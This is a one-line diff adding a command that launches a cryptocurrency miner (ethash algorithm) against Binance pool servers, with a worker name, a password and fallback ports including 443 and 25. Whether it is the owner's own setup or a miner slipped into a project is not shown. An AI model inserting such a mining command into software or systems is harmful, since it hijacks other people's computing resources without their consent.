@@ -1,0 +1,2 @@
+min --algo ethash --server ethash.poolbinance.com:1800 ethash.poolbinance.com:3333 ethash.poolbinance.com:443 ethash.poolbinance.com:25 --user adm78.001 adm78.001 adm78.001 adm78.001 -p 123456 123456 123456 123456 -i 60 --logfile log.txt --templimit 70
+
